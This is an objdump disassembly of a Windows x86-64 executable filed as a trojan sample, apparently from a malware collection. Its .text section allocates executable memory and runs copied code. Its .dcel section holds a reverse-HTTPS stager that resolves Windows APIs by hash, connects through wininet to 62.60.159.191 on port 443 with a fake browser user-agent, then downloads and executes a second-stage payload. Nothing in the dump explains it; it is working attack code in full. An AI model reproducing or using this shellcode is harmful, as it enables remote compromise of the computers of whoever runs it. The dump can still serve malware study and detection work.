
malware_samples/trojan/e5673b33660c96d634b936790ee1767cc91736dbb26ae04a07bd0fd773816918.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	49 c7 c1 40 00 00 00 	mov    $0x40,%r9
   14000100b:	49 c7 c0 00 30 00 00 	mov    $0x3000,%r8
   140001012:	48 c7 c2 00 10 00 00 	mov    $0x1000,%rdx
   140001019:	48 33 c9             	xor    %rcx,%rcx
   14000101c:	e8 27 10 00 00       	call   0x140002048
   140001021:	48 c7 c1 00 10 00 00 	mov    $0x1000,%rcx
   140001028:	48 be 41 10 00 40 01 	movabs $0x140001041,%rsi
   14000102f:	00 00 00 
   140001032:	48 8b f8             	mov    %rax,%rdi
   140001035:	f3 a4                	rep movsb (%rsi),(%rdi)
   140001037:	ff d0                	call   *%rax
   140001039:	48 33 c9             	xor    %rcx,%rcx
   14000103c:	e8 01 10 00 00       	call   0x140002042
   140001041:	50                   	push   %rax
   140001042:	41 59                	pop    %r9
   140001044:	4c                   	rex.WR
   140001045:	4f                   	rex.WRXB
   140001046:	41                   	rex.B
   140001047:	44 3a 00             	cmp    (%rax),%r8b
	...
   14000203e:	00 00                	add    %al,(%rax)
   140002040:	00 cc                	add    %cl,%ah
   140002042:	ff 25 c0 0f 00 00    	jmp    *0xfc0(%rip)        # 0x140003008
   140002048:	ff 25 b2 0f 00 00    	jmp    *0xfb2(%rip)        # 0x140003000

Disassembly of section .dcel:

0000000140004000 <.dcel>:
   140004000:	fc                   	cld
   140004001:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
   140004005:	e8 cc 00 00 00       	call   0x1400040d6
   14000400a:	41 51                	push   %r9
   14000400c:	41 50                	push   %r8
   14000400e:	52                   	push   %rdx
   14000400f:	51                   	push   %rcx
   140004010:	48 31 d2             	xor    %rdx,%rdx
   140004013:	65 48 8b 52 60       	mov    %gs:0x60(%rdx),%rdx
   140004018:	48 8b 52 18          	mov    0x18(%rdx),%rdx
   14000401c:	48 8b 52 20          	mov    0x20(%rdx),%rdx
   140004020:	56                   	push   %rsi
   140004021:	48 0f b7 4a 4a       	movzwq 0x4a(%rdx),%rcx
   140004026:	48 8b 72 50          	mov    0x50(%rdx),%rsi
   14000402a:	4d 31 c9             	xor    %r9,%r9
   14000402d:	48 31 c0             	xor    %rax,%rax
   140004030:	ac                   	lods   (%rsi),%al
   140004031:	3c 61                	cmp    $0x61,%al
   140004033:	7c 02                	jl     0x140004037
   140004035:	2c 20                	sub    $0x20,%al
   140004037:	41 c1 c9 0d          	ror    $0xd,%r9d
   14000403b:	41 01 c1             	add    %eax,%r9d
   14000403e:	e2 ed                	loop   0x14000402d
   140004040:	52                   	push   %rdx
   140004041:	41 51                	push   %r9
   140004043:	48 8b 52 20          	mov    0x20(%rdx),%rdx
   140004047:	8b 42 3c             	mov    0x3c(%rdx),%eax
   14000404a:	48 01 d0             	add    %rdx,%rax
   14000404d:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140004053:	0f 85 72 00 00 00    	jne    0x1400040cb
   140004059:	8b 80 88 00 00 00    	mov    0x88(%rax),%eax
   14000405f:	48 85 c0             	test   %rax,%rax
   140004062:	74 67                	je     0x1400040cb
   140004064:	48 01 d0             	add    %rdx,%rax
   140004067:	50                   	push   %rax
   140004068:	8b 48 18             	mov    0x18(%rax),%ecx
   14000406b:	44 8b 40 20          	mov    0x20(%rax),%r8d
   14000406f:	49 01 d0             	add    %rdx,%r8
   140004072:	e3 56                	jrcxz  0x1400040ca
   140004074:	48 ff c9             	dec    %rcx
   140004077:	4d 31 c9             	xor    %r9,%r9
   14000407a:	41 8b 34 88          	mov    (%r8,%rcx,4),%esi
   14000407e:	48 01 d6             	add    %rdx,%rsi
   140004081:	48 31 c0             	xor    %rax,%rax
   140004084:	41 c1 c9 0d          	ror    $0xd,%r9d
   140004088:	ac                   	lods   (%rsi),%al
   140004089:	41 01 c1             	add    %eax,%r9d
   14000408c:	38 e0                	cmp    %ah,%al
   14000408e:	75 f1                	jne    0x140004081
   140004090:	4c 03 4c 24 08       	add    0x8(%rsp),%r9
   140004095:	45 39 d1             	cmp    %r10d,%r9d
   140004098:	75 d8                	jne    0x140004072
   14000409a:	58                   	pop    %rax
   14000409b:	44 8b 40 24          	mov    0x24(%rax),%r8d
   14000409f:	49 01 d0             	add    %rdx,%r8
   1400040a2:	66 41 8b 0c 48       	mov    (%r8,%rcx,2),%cx
   1400040a7:	44 8b 40 1c          	mov    0x1c(%rax),%r8d
   1400040ab:	49 01 d0             	add    %rdx,%r8
   1400040ae:	41 8b 04 88          	mov    (%r8,%rcx,4),%eax
   1400040b2:	48 01 d0             	add    %rdx,%rax
   1400040b5:	41 58                	pop    %r8
   1400040b7:	41 58                	pop    %r8
   1400040b9:	5e                   	pop    %rsi
   1400040ba:	59                   	pop    %rcx
   1400040bb:	5a                   	pop    %rdx
   1400040bc:	41 58                	pop    %r8
   1400040be:	41 59                	pop    %r9
   1400040c0:	41 5a                	pop    %r10
   1400040c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400040c6:	41 52                	push   %r10
   1400040c8:	ff e0                	jmp    *%rax
   1400040ca:	58                   	pop    %rax
   1400040cb:	41 59                	pop    %r9
   1400040cd:	5a                   	pop    %rdx
   1400040ce:	48 8b 12             	mov    (%rdx),%rdx
   1400040d1:	e9 4b ff ff ff       	jmp    0x140004021
   1400040d6:	5d                   	pop    %rbp
   1400040d7:	48 31 db             	xor    %rbx,%rbx
   1400040da:	53                   	push   %rbx
   1400040db:	49 be 77 69 6e 69 6e 	movabs $0x74656e696e6977,%r14
   1400040e2:	65 74 00 
   1400040e5:	41 56                	push   %r14
   1400040e7:	48 89 e1             	mov    %rsp,%rcx
   1400040ea:	49 c7 c2 4c 77 26 07 	mov    $0x726774c,%r10
   1400040f1:	ff d5                	call   *%rbp
   1400040f3:	53                   	push   %rbx
   1400040f4:	53                   	push   %rbx
   1400040f5:	e8 76 00 00 00       	call   0x140004170
   1400040fa:	4d 6f                	rex.WRB outsl (%rsi),(%dx)
   1400040fc:	7a 69                	jp     0x140004167
   1400040fe:	6c                   	insb   (%dx),(%rdi)
   1400040ff:	6c                   	insb   (%dx),(%rdi)
   140004100:	61                   	(bad)
   140004101:	2f                   	(bad)
   140004102:	35 2e 30 20 28       	xor    $0x2820302e,%eax
   140004107:	4d 61                	rex.WRB (bad)
   140004109:	63 69 6e             	movsxd 0x6e(%rcx),%ebp
   14000410c:	74 6f                	je     0x14000417d
   14000410e:	73 68                	jae    0x140004178
   140004110:	3b 20                	cmp    (%rax),%esp
   140004112:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140004114:	74 65                	je     0x14000417b
   140004116:	6c                   	insb   (%dx),(%rdi)
   140004117:	20 4d 61             	and    %cl,0x61(%rbp)
   14000411a:	63 20                	movsxd (%rax),%esp
   14000411c:	4f 53                	rex.WRXB push %r11
   14000411e:	20 58 20             	and    %bl,0x20(%rax)
   140004121:	31 30                	xor    %esi,(%rax)
   140004123:	5f                   	pop    %rdi
   140004124:	31 35 5f 37 29 20    	xor    %esi,0x2029375f(%rip)        # 0x160297889
   14000412a:	41 70 70             	rex.B jo 0x14000419d
   14000412d:	6c                   	insb   (%dx),(%rdi)
   14000412e:	65 57                	gs push %rdi
   140004130:	65 62 4b 69 74 2f    	(bad)
   140004136:	35 33 37 2e 33       	xor    $0x332e3733,%eax
   14000413b:	36 20 28             	ss and %ch,(%rax)
   14000413e:	4b                   	rex.WXB
   14000413f:	48 54                	rex.W push %rsp
   140004141:	4d                   	rex.WRB
   140004142:	4c 2c 20             	rex.WR sub $0x20,%al
   140004145:	6c                   	insb   (%dx),(%rdi)
   140004146:	69 6b 65 20 47 65 63 	imul   $0x63654720,0x65(%rbx),%ebp
   14000414d:	6b 6f 29 20          	imul   $0x20,0x29(%rdi),%ebp
   140004151:	43 68 72 6f 6d 65    	rex.XB push $0x656d6f72
   140004157:	2f                   	(bad)
   140004158:	31 33                	xor    %esi,(%rbx)
   14000415a:	31 2e                	xor    %ebp,(%rsi)
   14000415c:	30 2e                	xor    %ch,(%rsi)
   14000415e:	30 2e                	xor    %ch,(%rsi)
   140004160:	30 20                	xor    %ah,(%rax)
   140004162:	53                   	push   %rbx
   140004163:	61                   	(bad)
   140004164:	66 61                	data16 (bad)
   140004166:	72 69                	jb     0x1400041d1
   140004168:	2f                   	(bad)
   140004169:	35 33 37 2e 33       	xor    $0x332e3733,%eax
   14000416e:	36 00 59 53          	ss add %bl,0x53(%rcx)
   140004172:	5a                   	pop    %rdx
   140004173:	4d 31 c0             	xor    %r8,%r8
   140004176:	4d 31 c9             	xor    %r9,%r9
   140004179:	53                   	push   %rbx
   14000417a:	53                   	push   %rbx
   14000417b:	49 ba 3a 56 79 a7 00 	movabs $0xa779563a,%r10
   140004182:	00 00 00 
   140004185:	ff d5                	call   *%rbp
   140004187:	e8 0e 00 00 00       	call   0x14000419a
   14000418c:	36 32 2e             	ss xor (%rsi),%ch
   14000418f:	36 30 2e             	ss xor %ch,(%rsi)
   140004192:	31 35 39 2e 31 39    	xor    %esi,0x39312e39(%rip)        # 0x179316fd1
   140004198:	31 00                	xor    %eax,(%rax)
   14000419a:	5a                   	pop    %rdx
   14000419b:	48 89 c1             	mov    %rax,%rcx
   14000419e:	49 c7 c0 bb 01 00 00 	mov    $0x1bb,%r8
   1400041a5:	4d 31 c9             	xor    %r9,%r9
   1400041a8:	53                   	push   %rbx
   1400041a9:	53                   	push   %rbx
   1400041aa:	6a 03                	push   $0x3
   1400041ac:	53                   	push   %rbx
   1400041ad:	49 ba 57 89 9f c6 00 	movabs $0xc69f8957,%r10
   1400041b4:	00 00 00 
   1400041b7:	ff d5                	call   *%rbp
   1400041b9:	e8 eb 00 00 00       	call   0x1400042a9
   1400041be:	2f                   	(bad)
   1400041bf:	68 33 6c 75 4f       	push   $0x4f756c33
   1400041c4:	69 73 62 5a 7a 53 32 	imul   $0x32537a5a,0x62(%rbx),%esi
   1400041cb:	58                   	pop    %rax
   1400041cc:	37                   	(bad)
   1400041cd:	64 64 33 76 56       	fs xor %fs:0x56(%rsi),%esi
   1400041d2:	4e 35 67 77 6b 38    	rex.WRX xor $0x386b7767,%rax
   1400041d8:	65 70 51             	gs jo  0x14000422c
   1400041db:	7a 56                	jp     0x140004233
   1400041dd:	66 6e                	data16 outsb (%rsi),(%dx)
   1400041df:	34 63                	xor    $0x63,%al
   1400041e1:	75 37                	jne    0x14000421a
   1400041e3:	32 4f 42             	xor    0x42(%rdi),%cl
   1400041e6:	62 43 4b 65 30       	(bad)
   1400041eb:	37                   	(bad)
   1400041ec:	5f                   	pop    %rdi
   1400041ed:	48 53                	rex.W push %rbx
   1400041ef:	74 56                	je     0x140004247
   1400041f1:	33 42 54             	xor    0x54(%rdx),%eax
   1400041f4:	54                   	push   %rsp
   1400041f5:	6a 39                	push   $0x39
   1400041f7:	48                   	rex.W
   1400041f8:	36 35 72 6e 6c 6c    	ss xor $0x6c6c6e72,%eax
   1400041fe:	73 64                	jae    0x140004264
   140004200:	4e                   	rex.WRX
   140004201:	45 63 6e 47          	movsxd 0x47(%r14),%r13d
   140004205:	74 58                	je     0x14000425f
   140004207:	71 62                	jno    0x14000426b
   140004209:	71 39                	jno    0x140004244
   14000420b:	39 6d 52             	cmp    %ebp,0x52(%rbp)
   14000420e:	68 37 32 72 32       	push   $0x32723237
   140004213:	78 30                	js     0x140004245
   140004215:	75 4c                	jne    0x140004263
   140004217:	73 35                	jae    0x14000424e
   140004219:	58                   	pop    %rax
   14000421a:	76 74                	jbe    0x140004290
   14000421c:	4b 38 6a 48          	rex.WXB cmp %bpl,0x48(%r10)
   140004220:	6e                   	outsb  (%rsi),(%dx)
   140004221:	6f                   	outsl  (%rsi),(%dx)
   140004222:	47                   	rex.RXB
   140004223:	4b 77 73             	rex.WXB ja 0x140004299
   140004226:	7a 4d                	jp     0x140004275
   140004228:	52                   	push   %rdx
   140004229:	72 4d                	jb     0x140004278
   14000422b:	38 6b 37             	cmp    %ch,0x37(%rbx)
   14000422e:	52                   	push   %rdx
   14000422f:	75 63                	jne    0x140004294
   140004231:	79 42                	jns    0x140004275
   140004233:	6f                   	outsl  (%rsi),(%dx)
   140004234:	4f 35 6e 52 43 39    	rex.WRXB xor $0x3943526e,%rax
   14000423a:	79 57                	jns    0x140004293
   14000423c:	4c 2d 4a 6b 61 51    	rex.WR sub $0x51616b4a,%rax
   140004242:	35 54 41 36 77       	xor    $0x77364154,%eax
   140004247:	47 72 71             	rex.RXB jb 0x1400042bb
   14000424a:	79 4f                	jns    0x14000429b
   14000424c:	36 37                	ss (bad)
   14000424e:	34 62                	xor    $0x62,%al
   140004250:	34 32                	xor    $0x32,%al
   140004252:	69 30 37 67 75 4e    	imul   $0x4e756737,(%rax),%esi
   140004258:	79 35                	jns    0x14000428f
   14000425a:	39 77 58             	cmp    %esi,0x58(%rdi)
   14000425d:	51                   	push   %rcx
   14000425e:	34 6b                	xor    $0x6b,%al
   140004260:	62 6f 55 74 59       	(bad)
   140004265:	79 6b                	jns    0x1400042d2
   140004267:	30 59 49             	xor    %bl,0x49(%rcx)
   14000426a:	4f 68 5a 31 6b 65    	rex.WRXB push $0x656b315a
   140004270:	30 39                	xor    %bh,(%rcx)
   140004272:	75 55                	jne    0x1400042c9
   140004274:	30 56 30             	xor    %dl,0x30(%rsi)
   140004277:	48 70 54             	rex.W jo 0x1400042ce
   14000427a:	72 71                	jb     0x1400042ed
   14000427c:	30 4f 43             	xor    %cl,0x43(%rdi)
   14000427f:	53                   	push   %rbx
   140004280:	74 43                	je     0x1400042c5
   140004282:	71 4f                	jno    0x1400042d3
   140004284:	48                   	rex.W
   140004285:	48 72 6d             	rex.W jb 0x1400042f5
   140004288:	41                   	rex.B
   140004289:	4b 51                	rex.WXB push %r9
   14000428b:	6b 56 5f 42          	imul   $0x42,0x5f(%rsi),%edx
   14000428f:	39 4b 45             	cmp    %ecx,0x45(%rbx)
   140004292:	4d 34 73             	rex.WRB xor $0x73,%al
   140004295:	79 67                	jns    0x1400042fe
   140004297:	38 37                	cmp    %dh,(%rdi)
   140004299:	5a                   	pop    %rdx
   14000429a:	55                   	push   %rbp
   14000429b:	4f 69 67 6d 70 38 4e 	rex.WRXB imul $0x7a4e3870,0x6d(%r15),%r12
   1400042a2:	7a 
   1400042a3:	6b 47 63 52          	imul   $0x52,0x63(%rdi),%eax
   1400042a7:	39 00                	cmp    %eax,(%rax)
   1400042a9:	48 89 c1             	mov    %rax,%rcx
   1400042ac:	53                   	push   %rbx
   1400042ad:	5a                   	pop    %rdx
   1400042ae:	41 58                	pop    %r8
   1400042b0:	4d 31 c9             	xor    %r9,%r9
   1400042b3:	53                   	push   %rbx
   1400042b4:	48 b8 00 32 a8 84 00 	movabs $0x84a83200,%rax
   1400042bb:	00 00 00 
   1400042be:	50                   	push   %rax
   1400042bf:	53                   	push   %rbx
   1400042c0:	53                   	push   %rbx
   1400042c1:	49 c7 c2 eb 55 2e 3b 	mov    $0x3b2e55eb,%r10
   1400042c8:	ff d5                	call   *%rbp
   1400042ca:	48 89 c6             	mov    %rax,%rsi
   1400042cd:	6a 0a                	push   $0xa
   1400042cf:	5f                   	pop    %rdi
   1400042d0:	48 89 f1             	mov    %rsi,%rcx
   1400042d3:	6a 1f                	push   $0x1f
   1400042d5:	5a                   	pop    %rdx
   1400042d6:	52                   	push   %rdx
   1400042d7:	68 80 33 00 00       	push   $0x3380
   1400042dc:	49 89 e0             	mov    %rsp,%r8
   1400042df:	6a 04                	push   $0x4
   1400042e1:	41 59                	pop    %r9
   1400042e3:	49 ba 75 46 9e 86 00 	movabs $0x869e4675,%r10
   1400042ea:	00 00 00 
   1400042ed:	ff d5                	call   *%rbp
   1400042ef:	4d 31 c0             	xor    %r8,%r8
   1400042f2:	53                   	push   %rbx
   1400042f3:	5a                   	pop    %rdx
   1400042f4:	48 89 f1             	mov    %rsi,%rcx
   1400042f7:	4d 31 c9             	xor    %r9,%r9
   1400042fa:	4d 31 c9             	xor    %r9,%r9
   1400042fd:	53                   	push   %rbx
   1400042fe:	53                   	push   %rbx
   1400042ff:	49 c7 c2 2d 06 18 7b 	mov    $0x7b18062d,%r10
   140004306:	ff d5                	call   *%rbp
   140004308:	85 c0                	test   %eax,%eax
   14000430a:	75 1f                	jne    0x14000432b
   14000430c:	48 c7 c1 88 13 00 00 	mov    $0x1388,%rcx
   140004313:	49 ba 44 f0 35 e0 00 	movabs $0xe035f044,%r10
   14000431a:	00 00 00 
   14000431d:	ff d5                	call   *%rbp
   14000431f:	48 ff cf             	dec    %rdi
   140004322:	74 02                	je     0x140004326
   140004324:	eb aa                	jmp    0x1400042d0
   140004326:	e8 55 00 00 00       	call   0x140004380
   14000432b:	53                   	push   %rbx
   14000432c:	59                   	pop    %rcx
   14000432d:	6a 40                	push   $0x40
   14000432f:	5a                   	pop    %rdx
   140004330:	49 89 d1             	mov    %rdx,%r9
   140004333:	c1 e2 10             	shl    $0x10,%edx
   140004336:	49 c7 c0 00 10 00 00 	mov    $0x1000,%r8
   14000433d:	49 ba 58 a4 53 e5 00 	movabs $0xe553a458,%r10
   140004344:	00 00 00 
   140004347:	ff d5                	call   *%rbp
   140004349:	48 93                	xchg   %rax,%rbx
   14000434b:	53                   	push   %rbx
   14000434c:	53                   	push   %rbx
   14000434d:	48 89 e7             	mov    %rsp,%rdi
   140004350:	48 89 f1             	mov    %rsi,%rcx
   140004353:	48 89 da             	mov    %rbx,%rdx
   140004356:	49 c7 c0 00 20 00 00 	mov    $0x2000,%r8
   14000435d:	49 89 f9             	mov    %rdi,%r9
   140004360:	49 ba 12 96 89 e2 00 	movabs $0xe2899612,%r10
   140004367:	00 00 00 
   14000436a:	ff d5                	call   *%rbp
   14000436c:	48 83 c4 20          	add    $0x20,%rsp
   140004370:	85 c0                	test   %eax,%eax
   140004372:	74 b2                	je     0x140004326
   140004374:	66 8b 07             	mov    (%rdi),%ax
   140004377:	48 01 c3             	add    %rax,%rbx
   14000437a:	85 c0                	test   %eax,%eax
   14000437c:	75 d2                	jne    0x140004350
   14000437e:	58                   	pop    %rax
   14000437f:	c3                   	ret
   140004380:	58                   	pop    %rax
   140004381:	6a 00                	push   $0x0
   140004383:	59                   	pop    %rcx
   140004384:	49 c7 c2 f0 b5 a2 56 	mov    $0x56a2b5f0,%r10
   14000438b:	ff d5                	call   *%rbp
   14000438d:	00 00                	add    %al,(%rax)
   14000438f:	00 b8 43 00 00 00    	add    %bh,0x43(%rax)
   140004395:	00 00                	add    %al,(%rax)
   140004397:	00 ff                	add    %bh,%bh
   140004399:	ff                   	(bad)
   14000439a:	ff                   	(bad)
   14000439b:	ff d0                	call   *%rax
   14000439d:	43 00 00             	rex.XB add %al,(%r8)
   1400043a0:	00 30                	add    %dh,(%rax)
	...
   1400043b6:	00 00                	add    %al,(%rax)
   1400043b8:	de 43 00             	fiadds 0x0(%rbx)
   1400043bb:	00 00                	add    %al,(%rax)
   1400043bd:	00 00                	add    %al,(%rax)
   1400043bf:	00 ee                	add    %ch,%dh
   1400043c1:	43 00 00             	rex.XB add %al,(%r8)
	...
   1400043d0:	4b                   	rex.WXB
   1400043d1:	45 52                	rex.RB push %r10
   1400043d3:	4e                   	rex.WRX
   1400043d4:	45                   	rex.RB
   1400043d5:	4c 33 32             	xor    (%rdx),%r14
   1400043d8:	2e 64 6c             	cs fs insb (%dx),(%rdi)
   1400043db:	6c                   	insb   (%dx),(%rdi)
   1400043dc:	00 00                	add    %al,(%rax)
   1400043de:	58                   	pop    %rax
   1400043df:	04 56                	add    $0x56,%al
   1400043e1:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%rdx),%esi
   1400043e8:	6c                   	insb   (%dx),(%rdi)
   1400043e9:	6c                   	insb   (%dx),(%rdi)
   1400043ea:	6f                   	outsl  (%rsi),(%dx)
   1400043eb:	63 00                	movsxd (%rax),%eax
   1400043ed:	00 05 01 45 78 69    	add    %al,0x69784501(%rip)        # 0x1a97888f4
   1400043f3:	74 50                	je     0x140004445
   1400043f5:	72 6f                	jb     0x140004466
   1400043f7:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400043fa:	73 00                	jae    0x1400043fc
	...
   140004404:	08 00                	or     %al,(%rax)
	...
